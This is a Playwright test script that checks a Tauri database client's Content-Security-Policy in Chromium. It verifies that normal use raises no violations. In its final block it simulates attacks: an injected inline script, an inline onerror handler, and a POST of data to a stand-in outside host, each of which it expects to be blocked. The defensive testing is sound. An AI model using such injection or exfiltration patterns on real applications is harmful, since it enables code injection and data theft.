#!/usr/bin/env node
// The Content-Security-Policy, in Chromium (stubbed `invoke`): the built app
// is served under csp.mjs's policy for its report URL, with the hashes of
// index.html's inline scripts added to script-src as Tauri adds them when it
// builds. Connecting, a query, ⌘K and a sent report raise no violation. An
// injected inline script, an inline event handler and a request to another
// origin are refused. (eval isn't checked: Playwright's evaluate runs outside
// the page's policy; script-src has no 'unsafe-eval', which test/csp.test.ts
// checks.)
//
// WebKit (macOS, Linux) and WebView2 enforce the same policy but aren't
// checked here; nor is Tauri's own injection (its IPC scripts are user
// scripts, outside the page's policy, as Playwright's init scripts are).
//
//   cd apps/rowkery-tauri && VITE_ROWKERY_REPORT_URL=https://relay.test/report npx vite build
//   node scripts/csp-browser-proof.mjs [outDir]
//   node scripts/csp-browser-proof.mjs --serve [port]   # serve only, for other proofs (ROWKERY_DEV_URL)
import { createRequire } from "node:module";
import { createHash } from "node:crypto";
import { createServer } from "node:http";
import { existsSync, mkdirSync, readFileSync } from "node:fs";
import { execSync } from "node:child_process";
import { extname, join, normalize } from "node:path";
import { appCsp } from "../apps/rowkery-tauri/csp.mjs";

const DIST = new globalThis.URL("../apps/rowkery-tauri/dist/", import.meta.url).pathname;
const RELAY = "https://relay.test/report";
const serveOnly = process.argv[2] === "--serve";
const PORT = Number((serveOnly ? process.argv[3] : process.env.CSP_PORT) ?? 1439);
const OUT = (!serveOnly && process.argv[2]) || "/tmp/rowkery-proof/csp";

if (!existsSync(join(DIST, "index.html"))) {
  console.error("FAIL: no apps/rowkery-tauri/dist; build it first (see the header)");
  process.exit(1);
}
const index = readFileSync(join(DIST, "index.html"), "utf8");
// Tauri hashes each inline <script> of the HTML into script-src.
const hashes = [...index.matchAll(/<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/g)].map(
  (m) => `'sha256-${createHash("sha256").update(m[1]).digest("base64")}'`,
);
const csp = appCsp(RELAY).replace("script-src 'self'", ["script-src 'self'", ...hashes].join(" "));
const TYPES = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css", ".svg": "image/svg+xml", ".woff2": "font/woff2", ".woff": "font/woff", ".png": "image/png" };
const server = createServer((req, res) => {
  const path = normalize(decodeURIComponent(new globalThis.URL(req.url, "http://x").pathname)).replace(/^(\.\.[/\\])+/, "");
  let file = join(DIST, path);
  if (!file.startsWith(DIST) || !existsSync(file) || path.endsWith("/")) file = join(DIST, "index.html");
  res.writeHead(200, { "content-type": TYPES[extname(file)] ?? "application/octet-stream", "content-security-policy": csp });
  res.end(readFileSync(file));
});
await new Promise((r) => server.listen(PORT, r));
const URL = `http://localhost:${PORT}/`;
if (serveOnly) {
  console.log(`serving ${DIST} at ${URL} under: ${csp}`);
} else {
  await prove();
  server.close();
}

async function prove() {
  const require = createRequire(import.meta.url);
  let playwright;
  try {
    playwright = require("playwright");
  } catch {
    playwright = require(`${execSync("npm root -g").toString().trim()}/playwright`);
  }
  mkdirSync(OUT, { recursive: true });
  const check = (cond, msg) => {
    if (!cond) {
      console.error(`FAIL: ${msg}`);
      process.exitCode = 1;
    } else console.log(`ok: ${msg}`);
  };

  function stubTauri() {
    localStorage.clear();
    window.__CSP__ = [];
    document.addEventListener("securitypolicyviolation", (e) =>
      window.__CSP__.push({ directive: e.effectiveDirective, blocked: e.blockedURI, sample: e.sample }),
    );
    let nextId = 0;
    const catalog = { databases: [{ name: "rowkery", schemas: [{ name: "public", tables: [{ name: "items", columns: [{ name: "id", type_name: "int8", nullable: false }], primary_key: ["id"], indexes: [], foreign_keys: [], row_estimate: { Approximate: 3 }, partition_of: null }] }] }] };
    window.__TAURI_INTERNALS__ = {
      metadata: { currentWindow: { label: "main" }, currentWebview: { label: "main" } },
      transformCallback: () => 0,
      invoke: async (cmd, args) => {
        switch (cmd) {
          case "list_connections":
            return { connections: [{ kind: "postgres", id: "pg", name: "arcade", host: "127.0.0.1", port: 54329, database: "rowkery", username: "rowkery" }], active_connection_id: null };
          case "open_window":
            return { database: "rowkery", catalog, server_version: "16.4", elapsed_ms: 2, cached: false, open_seq: 1 };
          case "app_info":
            return { version: "0.1.0", os: "linux", os_version: "6", arch: "x86_64" };
          case "run_query": {
            const queryId = ++nextId;
            setTimeout(() => {
              const f = (x) => args.onFrame.onmessage({ query_id: queryId, ...x });
              f({ t: "columns", columns: [{ name: "id", type_name: "int8" }] });
              f({ t: "rows", seq: 0, rows: [[{ Int: 1 }], [{ Int: 2 }], [{ Int: 3 }]] });
              f({ t: "done", status: "ok", row_count: 3, affected_rows: null, elapsed_ms: 2, first_row_ms: 1, frames: 1, error: null, sqlstate: null, error_position: null, hold: null });
            }, 5);
            return queryId;
          }
          default:
            return null;
        }
      },
    };
  }

  const browser = await playwright.chromium.launch({ executablePath: process.env.CHROMIUM_PATH ?? "/opt/pw-browsers/chromium" });
  const page = await browser.newPage({ viewport: { width: 1280, height: 800 }, deviceScaleFactor: 2 });
  const errors = [];
  page.on("pageerror", (e) => errors.push(e.message));
  page.on("console", (m) => m.type() === "error" && errors.push(m.text()));
  const posts = [];
  await page.route(RELAY, async (route) => {
    const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "content-type" };
    if (route.request().method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
    posts.push(route.request().postData());
    return route.fulfill({ status: 200, headers: { ...cors, "content-type": "application/json" }, body: '{"ok":true}' });
  });
  await page.addInitScript({ path: new globalThis.URL("./lib/linux-platform.js", import.meta.url).pathname });
  await page.addInitScript(stubTauri);
  const response = await page.goto(URL);
  check((response.headers()["content-security-policy"] ?? "").startsWith("default-src 'self'; script-src 'self' 'sha256-"), "the page is served under the policy, with index.html's inline scripts hashed");
  const ws = '[data-testid="workspace"]:not([hidden])';
  await page.waitForSelector(ws);
  check(await page.evaluate(() => performance.getEntriesByName("webview-ready").length === 1 && !!document.documentElement.dataset.theme), "index.html's inline scripts ran (theme set, webview-ready marked)");

  // The app at work: connect, run, ⌘K, a report.
  await page.keyboard.press("Control+Shift+O");
  await page.waitForSelector('[data-testid="conn-popover"]');
  await page.keyboard.press("Enter");
  await page.waitForSelector(`${ws}[data-conn-state="connected"]`);
  await page.click(`${ws} textarea[data-testid="sql-editor"]`);
  await page.keyboard.type("SELECT id FROM items");
  await page.keyboard.press("Control+Enter");
  await page.waitForFunction((ws) => document.querySelector(`${ws} [data-testid="results-grid-wrap"]`)?.getAttribute("data-row-count") === "3", ws);
  const fonts = await page.evaluate(async () => {
    await document.fonts.ready;
    return [...document.fonts].filter((f) => f.status === "loaded").length;
  });
  check(fonts > 0, `the bundled fonts load (${fonts})`);
  await page.keyboard.press("Control+k");
  await page.waitForSelector('[data-testid="cp-row"]');
  await page.keyboard.type("report");
  await page.keyboard.press("Enter");
  await page.waitForSelector('[data-testid="rp-sheet"]');
  await page.keyboard.type("Checking the policy.");
  await page.click('[data-testid="rp-send"]');
  await page.waitForSelector('[data-testid="rp-sheet"]', { state: "detached" });
  check(posts.length === 1, "a report reaches the relay (its origin is in connect-src)");
  await page.screenshot({ path: `${OUT}/1-app-under-csp.png` });
  const quiet = await page.evaluate(() => window.__CSP__);
  check(quiet.length === 0, `no violations while the app works (${JSON.stringify(quiet)})`);
  check(errors.filter((e) => /Content Security Policy/i.test(e)).length === 0, `no CSP errors on the console (${errors.join(" | ")})`);

  // What the policy is for: injected code doesn't run, data doesn't leave.
  const attack = await page.evaluate(async () => {
    const s = document.createElement("script");
    s.textContent = "window.__inline = 1";
    document.body.append(s);
    const holder = document.createElement("div");
    holder.innerHTML = '<img src="data:," onerror="window.__handler = 1">';
    document.body.append(holder);
    let fetched = false;
    try {
      await fetch("https://elsewhere.test/collect", { method: "POST", body: "rows" });
      fetched = true;
    } catch {}
    await new Promise((r) => setTimeout(r, 200));
    return { inline: !!window.__inline, handler: !!window.__handler, fetched, violations: window.__CSP__.map((v) => v.directive) };
  });
  check(!attack.inline, "an injected inline <script> doesn't run");
  check(!attack.handler, "an inline event handler doesn't run");
  check(!attack.fetched, "a request to another origin is refused");
  check(
    ["script-src-elem", "script-src-attr", "connect-src"].every((d) => attack.violations.includes(d)),
    `each is reported as a violation (${attack.violations.join(", ")})`,
  );
  await browser.close();
}
